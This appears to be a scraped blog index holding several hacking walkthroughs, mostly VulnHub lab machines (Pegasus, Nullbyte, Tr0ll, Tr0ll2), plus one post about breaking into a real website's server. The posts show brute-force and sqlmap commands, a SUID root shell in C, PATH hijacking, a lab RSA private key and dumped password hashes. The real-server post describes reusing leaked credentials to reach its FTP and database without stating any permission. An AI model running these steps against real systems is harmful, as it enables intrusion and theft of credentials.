cause that is what we managed to do with my_first program to execute. Next i added on the $PATH the . so it can execute freely,inserted my payload and ran my_first program that made. What that file that i made did??it copied the /bin/dash file in the /tmp folder with elvated permissions and by elevated permissions i mean john! First thing i did, was to add my ssh public key in the authorized_keys of john’s and right away connect via ssh to himi typed sudo -l but this is what i got john@pegasus:~$ sudo -lMatching Defaults entries for john on this host: env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binUser john may run the following commands on this host: (root) NOPASSWD: /usr/local/sbin/nfsso…..yeah john@pegasus:~$ sudo /usr/local/sbin/nfs start Exporting directories for NFS kernel daemon… [ OK ] Starting NFS kernel daemon [ OK ] I went back to my Kali box and mounted the NFS. I created a file that would elevate my permissions to root and execute dash root@Tesla:~# cd /mntroot@Tesla:/mnt# mkdir nfsroot@Tesla:/mnt# mount 192.168.7.138:/opt/nfs nfsroot@Tesla:/mnt# cd nfsroot@Tesla:/mnt/nfs# cat file.c#include #include int main(int argc, char *argv[]){ setreuid(geteuid(), geteuid()); setregid(geteuid(), geteuid()); execv(“/bin/dash”, argv); return 0;}root@Tesla:/mnt/nfs# gcc -o root file.c -m32root@Tesla:/mnt/nfs# chmod 4777 root……And back to john john@pegasus:/opt/nfs$ ./root id uid=0(root) gid=0(root) groups=0(root),1000(john) cd /root ls flag cat flagHallelujah!! It was kinda hard since i hated format strings but anyway it was fun. thx to everyone + some bonus belowThis is the code that executed my C reverse shell from the codereview.php and also stopped it(mixed feelings on this one) mike@pegasus:~$ cat check_code.sh #!/bin/sh# I am a ‘human’ reviewing submitted source code :) #SOURCE_CODE=”/opt/code_review/code.c”Kill whatever is running after 120 secondsTIMEOUT=120while true; do echo “# Checking for code.c…” if [ -f $SOURCE_CODE ]; then echo “ # Compile…” /usr/bin/gcc -o /home/mike/code $SOURCE_CODE /bin/chmod 755 /home/mike/code echo “ # Run” (/home/mike/code) &amp;amp; PID=$! # Let the code run for $TIMEOUT, then kill it if still executing (/bin/sleep $TIMEOUT &amp;amp;&amp;amp; kill -9 $PID; echo “ # Killed ./code”) 2&amp;gt;/dev/null &amp;amp; WATCHER=$! # Kill the watched (code stopped executing before $TIMEOUT) wait $PID 2&amp;gt;/dev/null &amp;amp;&amp;amp; kill -9 $WATCHER; echo “ # Killed watcher” echo “ # Cleanup…” /bin/rm -f /home/mike/code $SOURCE_CODE fi /bin/sleep 1done" }, { "title": "Nullbyte %0 walkthrough", "url": "/posts/nullbyte-0-walkthrough/", "categories": "", "tags": "%0, ly0n, nullbyte, vm, vulnhub", "date": "2015-11-01 00:00:00 +0800", "snippet": "Hey everyone this is the nullbyte VM walkthrough from vulnhub that was created by ly0n.So we started with an nmap scan to check the open ports see their banners…&amp;gt;root@Tesla:~# nmap 192.168.7.133 -p- -AStarting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-10-31 14:35 EETNmap scan report for 192.168.7.133 (192.168.7.133)Host is up (0.00017s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))|http-server-header: Apache/2.4.10 (Debian)|_http-title: Null Byte 00 - level 1111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 34114/tcp status| 100024 1 40102/udp status777/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0)| ssh-hostkey: | 1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)| 2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)|_ 256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)34114/tcp open status 1 (RPC #100024)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 34114/tcp status|_ 100024 1 40102/udp statusMAC Address: 00:0C:29:AD:C8:3A (VMware)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.19Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kerneli tried to connect on the ssh first but there was no clue there so i moved into the http enumerationi downloaded that illuminati cursed symbol picture file(btw i have nothing to do with illuminati and all that weird crap if u saw that triangled at the top of my website :P ) and checked it out for some steg stylemore root@Tesla:~/Desktop# file main.gif main.gif: GIF image data, version 89a, 235 x 302root@Tesla:~/Desktop# exifbash: exif: command not foundroot@Tesla:~/Desktop# strings main.gif GIF89aP-): kzMb5nVYJwcccIII@@@GGG444999```«»EEE???^^^…..snippet….w8 a sec that looks like a smiley!!! what are u hiding???unveil ur secrets sesame..after checking the source code this is what we got – this form isn’t connected to mysql, password ain’t that complexof course first thing that popped to my head was bruteforcing with the classic rockyou.txt wordlist root@Tesla:~/Desktop# hydra -l none -P /usr/share/wordlists/rockyou.txt 192.168.7.133 http-post-form “/kzMb5nVYJw/index.php:key=^PASS^:invalid key”Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2015-10-31 14:48:16[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort…[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task[DATA] attacking service http-post-form on port 80[80][http-post-form] host: 192.168.7.133 login: none password: elite1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2015-10-31 14:48:38and then we used the pass eliteafter that i just typed enter to see possible outputthis probably uses the mysql db so i thought to check for sql injection and i was correct so i started using sqlmap to speed up the process root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a –dbsavailable databases [5]:[] information_schema[] mysql[] performance_schema[] phpmyadmin[*] sethroot@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D mysql –tablesThis gave me only a user tableroot@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D mysql -T user –columnsUser,Passwordroot@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D mysql -T user -C User,Password –dumpDatabase: mysqlTable: user[6 entries]+——————+——————————————-+| User | Password |+——————+——————————————-+| root | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 || root | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 || root | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 || root | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 || debian-sys-maint | *BD9EDF51931EC5408154EBBB88AA01DA22B8A8DC || phpmyadmin | *18DC78FB0C441444482C7D1132C7A23D705DAFA7 |+——————+——————————————-+root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D phpmyadmin –tablespma_usersthis actually gave me nothing :/root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D seth+——-+| users |+——-+root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D seth -T users –columns+———-+————-+| Column | Type |+———-+————-+| position | text || user | text || id | smallint(6) || pass | text |+———-+————-+root@Tesla:~/Desktop# sqlmap -u http://192.168.7.133/kzMb5nVYJw/420search.php?usrtosearch=a -D seth -T users -C id,user,pass –dump+—-+——–+———————————————+| id | user | pass |+—-+——–+———————————————+| 1 | ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE || 2 | isis | –not allowed– |+—-+——–+———————————————+of course after this i checked on google for the hashes and luckily two of them have been cracked alreadyaccording to the databases that we found, there was a phpmyadmin one so i figured there should be phpmyadmin and quite accurately…after a few tries the username was root and the password sunnyvalei figured that i could upload a web shell but there would be no reason for that since that would give me www access on the server and i dont like it since i remembered that i have actually found a few username and passwords to try out on the ssh :Dobviously i connected as ramses with the password omega and this is the system enumeration stepapparently there is an interested file named procwatch in the /var/www/backup folderin the read me file apparently he says that he needs to fix this messs… so we are lucky that we arrived early to the party before he fixed it. It looks like procwatch tries to run sh and ps but it doesnt do a very good job at it cause maybe the path location is wrong?or maybe god forbid havent been set yet? we will check it out with some binary tree analysis objdump -D procwatchso now we are gonna check the main part of the program cause if we actually manage to run a shell there we will get root privileges in other words things will escalate quite soon :Dapparently it pushes into the stack 7370 which in ascii is sp but because of little endian it is ps and then pushes a nullbyte(hence the name of the vm i guess) so the path is not set and if i will change it to a path i can use to get a shell things will get nastyyyy :Pobviously u can see from the picture that i added the /tmp folder in the $PATH and copied the /bin/sh to the tmp folder as ps and gave executable permissions. so after i ran procwatch we got a root shell!!!time to get the proof that we were here ;)so that is it folks. i want to thank ly0n for this challenge it was quite nice especially the way i had to realize how procwatch works or to be exact doesnt work :P and fianlly exploit it ;)" }, { "title": "Tr0ll2: The Revenge Of The Tr0ll!!", "url": "/posts/tr0ll2-the-revenge-of-the-tr0ll/", "categories": "", "tags": "hacking, lmao, tr0ll2, vm, vulnhub, zip", "date": "2015-10-24 00:00:00 +0800", "snippet": "Hello everyone this is tr0ll 2 as i promised. Time to get some root access on the server, cause i didnt do much these days, so i will stop blabbing and start to explain what is going on and how everything happened… ;)Of course as always i started an nmap scan to our dear tr0ll server&amp;gt;root@kali:~# nmap 192.168.124.131 -sVStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-12 18:13 EDTNmap scan report for 192.168.124.131 (192.168.124.131)Host is up (0.00016s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.2.22 ((Ubuntu))MAC Address: 00:0C:29:7C:A4:A9 (VMware)Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.51 secondsso this is where i started the ftp enumeration. I tried a couple of passwords and guessing. i actually got in and checked for the files and downloaded the only one i found there.the file was password protected to i left hanging around for later… :/lets go to the http service enumeration. this is the index pagethe source didn’t contain anything interesting so lets move ahead. i thought to check the robots.txt and ok this is not a damn robots.txt file this is a huge list!!!i mean come on!!!so because of this big list after i tried a few paths, they were fake…. -_- so i made a list and checked it with dirbmore root@kali:~/Desktop# cat locfnoobnopetry_harderkeep_tryingisnt_this_annoyingnothing_here404LOL_at_the_last_onetrolling_is_funzomg_is_this_ityou_found_meI_know_this_sucksYou_could_give_updont_botherwill_it_ever_endI_hope_you_scripted_thisok_this_is_itstop_whiningwhy_are_you_still_lookingjust_quitseriously_stop root@kali:~/Desktop# dirb http://192.168.124.131 locfDIRB v2.22By The Dark Raver—————–START_TIME: Mon Oct 12 18:20:40 2015URL_BASE: http://192.168.124.131/WORDLIST_FILES: locfGENERATED WORDS: 21—- Scanning URL: http://192.168.124.131/ —-==&amp;gt; DIRECTORY: http://192.168.124.131/noob/==&amp;gt; DIRECTORY: http://192.168.124.131/keep_trying/==&amp;gt; DIRECTORY: http://192.168.124.131/dont_bother/==&amp;gt; DIRECTORY: http://192.168.124.131/ok_this_is_it/—- Entering directory: http://192.168.124.131/noob/ —-—- Entering directory: http://192.168.124.131/keep_trying/ —-—- Entering directory: http://192.168.124.131/dont_bother/ —-—- Entering directory: http://192.168.124.131/ok_this_is_it/ —-END_TIME: Mon Oct 12 18:20:40 2015DOWNLOADED: 105 - FOUND: 0after checking the directories…i was in a dead end so i checked the size of the pictures of the paths what do you know…there is a fatter troll cat!!! it seems it has eaten a bit more data that it should… ^_^ root@kali:~/Desktop# wget http://192.168.124.131/dont_bother/cat_the_troll.jpg–2015-10-12 18:23:23– http://192.168.124.131/dont_bother/cat_the_troll.jpgConnecting to 192.168.124.131:80… connected.HTTP request sent, awaiting response… 200 OKLength: 15873 (16K) [image/jpeg]Saving to: ‘cat_the_troll.jpg’cat_the_troll.jpg 100%[=====================&amp;gt;] 15.50K –.-KB/s in 0s2015-10-12 18:23:23 (338 MB/s) - ‘cat_the_troll.jpg’ saved [15873/15873]root@kali:~/Desktop# file cat_the_troll.jpgcat_the_troll.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 500x302, frames 3root@kali:~/Desktop# strings cat_the_troll.jpgJFIF#3-652-108?QE8&amp;lt;M=01FGMTV[\\[7DcjcXjQY[W)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW&quot;aq2\\vRHsdwTiaDPaDP\\z!$aDc(Q@0S}}HQ)…snippet…8Jh;gYCJpV}A7U 4]=%em;lj\\p*/ p?E$Look Deep within y0ur_self for the answerthe “y0ur_self” word seems like a password or path… who knows… lets check it as a directoryAN ANSWER.TXT FILE!!! lets see if it is another troll or a real thing root@kali:~/Desktop# wget http://192.168.124.131/y0ur_self/answer.txt–2015-10-12 18:26:09– http://192.168.124.131/y0ur_self/answer.txtConnecting to 192.168.124.131:80… connected.HTTP request sent, awaiting response… 200 OKLength: 1412653 (1.3M) [text/plain]Saving to: ‘answer.txt’answer.txt 100%[=====================&amp;gt;] 1.35M –.-KB/s in 0.02s2015-10-12 18:26:09 (74.0 MB/s) - ‘answer.txt’ saved [1412653/1412653]root@kali:~/Desktop# cat answer.txtQQo=QQo=QUEKQUIKQUJNCg==QUMKQUNUSAo=QUkKQUlEUwo=QU0KQU9MCg==….snippet…..This is totally encrypted in base64 so.. root@kali:~/Desktop# base64 -d answer.txt &amp;gt;clanswer.txtAAAAABABMACACTHAIAIDSAMAOLAOLASCIIASLATM…….snippet………it seems like this is a wordlist and as we remember we had a password protected zip file ;) we are gonna attempt to crack it root@kali:~/Desktop# fcrackzip -v -D -u -p clanswer.txt lmao.zipfound file ‘noob’, (size cp/uc 1300/ 1679, flags 9, chk 1005)PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOLroot@kali:~/Desktop# unzip lmao.zipArchive: lmao.zip[lmao.zip] noob password:inflating: noobroot@kali:~/Desktop# file noobnoob: PEM RSA private key,and apparently this is an rsa ssh file called noob ;) so all good here root@kali:~/Desktop# cat noob—–BEGIN RSA PRIVATE KEY—–MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqqyDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPoq+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKye5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+ydunau+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlqUmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXRxgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKPaq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTWK+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxxn48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcBTEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIhWBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQvibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdqvKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvohywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSGth8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9sG9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17syeq51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NOvW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKGzp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==—–END RSA PRIVATE KEY—–i tried logging in with this as user noob it actually worked but the connection closed, so i thought time to check this exploit exploit. it is bash shellshock vulnerabllityas you can see it gave us access but not a normal shell so i used the pty.spawn of python to get one ;)apparently netcat aint allowed. after i ran the /bin/bash for some reason anything i wrote was doubled, i think it is cause of the buggy kali sana cause i tried it again later and worked like a charm althought i forgot to take some new pictures.i checked a couple of places for interesting files and in the filesystem i found a folder called nothing_to_see_here… so i went inside and there was another folder choose wisely so i thought here we are there are 3 doors!! door1,door2,door3all of them had a file called r00t that we would have to BOF it since it get user input and get root since it gives us the 0 id we so much want.so this is door number 1 and thx a lot btw for this -_-. if you guys keep seing some things double it is fine! and you are file too kali sana ain’t though :/ but since it worked who caresso door2 seemed pretty normal and probably the correct one to devote it some time but i checked the third one just to be sure..and w8 what???executing shell?for a moment i was like.. this cant be so easy and obviously i was right :/ it trolled me.so door number 2 it is!aaaaand segfault errorOf course i checked for protections and ASLR is off so yay. NX is off too :D actually there is no protection!after executing gdb with 500 digits i noticed that it overwrote EIP at 268 bytes so i executed this to check the ESPafter checking my friend google for an exec /bin/bash shellcode we got a good one and executed it the r00t file…of course we added a NOP sled just for better results :D and made the EIP jump to our esp address where all the magic happensaaaand LETS GET THAT FLAG BITCH!that is all folks thx for the tr0ll2 and i hope we will get a third one so we can complete this trilogy!" }, { "title": "Human Stupidity...NOT A VM", "url": "/posts/human-stupidity-not-a-vm/", "categories": "", "tags": "challenge, hack, human, not a vm, pwned, real, stupidity", "date": "2015-10-18 00:00:00 +0800", "snippet": "Hey everyone so this is the story of how i hacked into a server. this is not a vm, it was an actual server and i wont be giving much infos cause i dont want to expose the target to attacks.so lets say the name of the server i hacked into was www.stupid.com and the ip was 111.111.111.111. of course i started as always with nikto to get some vulnerabillities…they were interesting but something else was more important at a first glance!there was a .zip file called stupid.com.zip so i figured this must be a backup file so i downloaded and it indeed was a backup file… ;) /Human stupidity number 1 /so after i extracted it this is what we gotafter checking a few files i checked the sftp-config.json file to check for possible passwords and this is what we actually goti know that you cant see the password but trust me it was quite good so good job there :P anyway i found after a while an admin login page in the newcms folder path but unfortunately the pass and username didnt work there although by checking the admin php code i noticed that for the user’s session to be created it needs to read some files in the var folder but there were no files like them in the backup file good job again at this point.so i had to find another way soofc after finding out that tftp on port 22 might be running i scanned with nmap but it was closed too bad :/ although the ftp was open so i thought lets try it out and use the same password and username /Human stupidity number 2/&amp;gt;root@kali:~# ftp 111.111.111.111Connected to 111.111.111.111.220———- Welcome to Pure-FTPd [privsep] [TLS] ———-220-You are user number 1 of 50 allowed.220-Local time is now 01:43. Server port: 21.220-This is a private system - No anonymous login220-IPv6 connections are also welcome on this server.220 You will be disconnected after 15 minutes of inactivity.Name (111.111.111.111:root): stupid331 User stupid OK. Password requiredPassword:230 OK. Current restricted directory is /Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt;i wont be showing what i got in there but i went after the mysql file that i found out earlier! the var directory and the rest of the mysql db files were all there!!!i checked the mysql.php file and check this out define(‘dbase’,’dbase’);define(‘host’,’host’);define(‘user’,’user’);define(‘password’,’password’);define(‘port’,’port’);$server[dbase]=”stupid_site”;$server[host]=”localhost”;$server[user]=”stupid_site”;$server[password]=”a8XXXXXXX”;$server[port]=”3306”;morei found the /etc/shadow and the /etc/passwd files too but lets not worry about that for now/etc/shadow stupid1:$6$MTkxu6xGhH2lRj5D$ucHstupid2:$6$tZPS9ALNEVkT1xMP$pLDkCjwJv622L0mH28liDstupid3:$6$uc/QjiYI.uaw2xa1$uFoTlZxxVwrr2Msd82FtOstupid4:$6$KJ0dPziRX8lVkTq4$CIi7j3Vm9jLOz2IXelpC3stupid5:$6$Bk95YCxxhBuLKnSK$Jyq2RmFq12vJyu57m7FgOstupid6:$6$ow82ApgjPeO5Xf14$ly242LU95a5xtCvh82zEhstupid7:$6$3UdXUAEkctoPc17x$YlL4x1eIuCSFc/QbLaMevstupid8:$6$K56LoyADGjYB3HKx$RVAJbzs1vF5Lk8JGZ4gIPstupid9:$6$yyKMgLzqUXdgtbjJ$eky/XN4XaLHW.I8Y4iFOPalthough i didnt try to crack the passwords cause it would take time i tried to figure out the login password for the admin panel!i couldnt do much from the ftp so i went into mysql enumeration and the fun started!so i scanned the mysql port to check if it is open… root@kali:~# mysql -h 111.111.111.111 -u stupid_site -pEnter password: Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 259496Server version: 5.5.45-cll MySQL Community Server (GPL)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type ‘help;’ or ‘\\h’ for help. Type ‘\\c’ to clear the current input statement.mysql&amp;gt; show databases;+——————–+| Database |+——————–+| information_schema || stupid_site |+——————–+2 rows in set (0.10 sec)mysql&amp;gt; use stupid_site;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&amp;gt; show tables;+————————-+| Tables_in_stupid_site |+————————-+| activity || articles || categories || cmsmenu_new || cmsrights || deletedemails || downloads || emails || faq || guestbook || languages || links || mailqueue || menu || menus || newsletter_articles || newsletter_teaming || newsletter_teams || newsletters || packaging || pictures || pictures_cropings || pictures_types || relations || sitecategories || subcategories || users || variables || youtube |+————————-+29 rows in set (0.09 sec)mysql&amp;gt; mysql&amp;gt; select id,email,username,password,usertype from users;+——-+———————–+———-+————————–+| id | email | username |password |+——-+—————–+———-+——————————–+| 114| stupid@stupid.com | stupid |e10adc3949ba59abbe56e057f20f883e|+——-+—————–+———-+——————————–+1 row in set (0.09 sec)mysql&amp;gt;the first thing i tried was looking for the hash online aaaaaaaaaand /Human stupidity number 3/#FAILAND……..BOOMso that is pretty much it i didnt get root access because mysql didnt run as root and didnt find another way although all of this was a real pentest and the whole thing pretty much happened was of human stupidity and ignorance! although it was a good lesson and practise for me. Of course i did no harm and i had no evil intentions!! so that is it until my next challenge ;)ps: excuse my photoshop skills :P" }, { "title": "The troller trolled the Tr0ll", "url": "/posts/the-troller-trolled-the-tr0ll/", "categories": "", "tags": "challenges, escalation, exploitation, hacking, Maleus, priv, tr0ll, vulnhub", "date": "2015-10-11 00:00:00 +0800", "snippet": "Hey everyone so this is the VM for the tr0ll server! i know it is kind of old but since i am trolling everyday in real life i thought i would try it so tr0ll2 is on the way too :D Let me add here that this challenge was made by Maleus and hosted by vulnhub!Anyway lets stop with all the blabbing and start our challengetr0ll server ip:192.168.124.141kali ip:192.168.124.134At first i tried a nmap scan&amp;gt;root@kali:~# nmap 192.168.124.141 -vv -sVStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-10 12:01 EDTNSE: Loaded 33 scripts for scanning.Initiating ARP Ping Scan at 12:01Scanning 192.168.124.141 [1 port]Completed ARP Ping Scan at 12:01, 0.21s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 12:01Completed Parallel DNS resolution of 1 host. at 12:01, 0.00s elapsedInitiating SYN Stealth Scan at 12:01Scanning 192.168.124.141 (192.168.124.141) [1000 ports]Discovered open port 21/tcp on 192.168.124.141Discovered open port 22/tcp on 192.168.124.141Discovered open port 80/tcp on 192.168.124.141Completed SYN Stealth Scan at 12:01, 1.22s elapsed (1000 total ports)Initiating Service scan at 12:01Scanning 3 services on 192.168.124.141 (192.168.124.141)Completed Service scan at 12:01, 6.10s elapsed (3 services on 1 host)NSE: Script scanning 192.168.124.141.NSE: Starting runlevel 1 (of 1) scan.Initiating NSE at 12:01Completed NSE at 12:01, 1.27s elapsedNmap scan report for 192.168.124.141 (192.168.124.141)Host is up, received arp-response (0.00031s latency).Scanned at 2015-10-10 12:01:04 EDT for 9sNot shown: 997 closed portsReason: 997 resetsPORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.222/tcp open ssh syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))MAC Address: 00:0C:29:FE:92:AF (VMware)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.040KB)moreAs we can see, we have 3 ports open! SSH,FTP,HTTPso i started by connecting on the ftp with the classic anonymous access and guess what! i found a pcap file! root@kali:~# ftp 192.168.124.141Connected to 192.168.124.141.220 (vsFTPd 3.0.2)Name (192.168.124.141:root): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rwxrwxrwx 1 1000 0 8068 Aug 10 2014 lol.pcap226 Directory send OK.ftp&amp;gt; get lol.pcaplocal: lol.pcap remote: lol.pcap200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for lol.pcap (8068 bytes).226 Transfer complete.8068 bytes received in 0.00 secs (87.4346 MB/s)ftp&amp;gt; quit221 Goodbye.after this i downloaded the file and used wireshark to check it out!! interesting things have been captured… :Dfirst i found out a file named secret_stuff.txt ( i never found this file although i kind of forgot to look for it when i accessed the server)although that is not the only thing we noticed! there was a secret folder!!!!Well this is as far as we can get lets try some http enumeration and stuff…after i checked the http server boom! the tr0ll starts!nothing there so i checked the robots.txt and we found a folder named secret!holy server unveil your secrets!OMG another troll…. -_- i was like ok suuuure now what?but then it hit me!we have that sup3rs3cr3tdirlol that could be a folder and what do u know…there is a file thereOfc i downloaded it and checked it out root@kali:~/Downloads# strings roflmao /lib/ld-linux.so.2libc.so.6_IO_stdin_usedprintflibc_start_main__gmon_startGLIBC_2.0PTRh[^_]Find address 0x0856BF to proceed;*2$”GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version……there is an interesting text telling me to find an address 0x0856BF i thought that could be a folder and checked it out…boom hints about the password of ssh hopefully ;)in the good_luck folder we found a file called which_one_lol.txt which seemed like a possible user list ofc i deleted the text that was saying &amp;lt;–definitely not this one so i saved it for laterthe other folder this_folder_contain_the_password had a Pass.txt file after opening it this is what i got…while trying to crack the damn ssh by crafting a list of the usernames and that password i got, i had zero success there was something wrong ofc the folder though told me that the password was in there but not in the file so i got the name of the Pass.txt and tried it as password so voila root@kali:~/Desktop# hydra ssh://192.168.124.141 -L user.txt -p Pass.txtHydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2015-10-10 12:20:15[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 10 tasks per 1 server, overall 64 tasks, 10 login tries (l:10/p:1), ~0 tries per task[DATA] attacking service ssh on port 22[22][ssh] host: 192.168.124.141 login: overflow password: Pass.txt1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2015-10-10 12:20:17the username for the ssh is overflow and the password is Pass.txt so lets connect on the ssh and work some magic!This is the place where we start our system enumeration to check what we can find…i looked around didnt find anything to stand out except from a file in the /opt folder called lmao.pywhich i couldnt read cause hello?low permissions so how do we do some priv escalation?we need to find writable file that can run as run so really quick we scan for any files that are writable sudo find / -perm -2 ! -type l -lswhat caught my attention though was this file! 155826 4 -rwxrwxrwx 1 root root 96 Aug 13 2014 /lib/log/cleaner.pyafter cat-ing the file we can see its code #!/usr/bin/env pythonimport osimport systry: os.system(‘rm -f /tmp/*’)except: sys.exit()this is good but how does this run???we can totally change the bash command to run something that will benefit us but how do we run it as root? lets look around…after a while i found out that cleaner.py was being executed every 2 minutes by cron schedule task. well the cleaner.py was deleting every 2 minutes whatever we might have downloaded in the /tmp folder so i modified and to this #!/usr/bin/env pythonimport osimport systry: os.system(‘ls /tmp/’)except: sys.exit()and it gave me some time although right about now we had a problem :/ the connection was closed -_- i feel another cron task every 2 minutes as i figured out laterso ofc i reconnected and i browsed to the /tmp folder as fast as possible to download the classic perl reverse shell backdoor,i 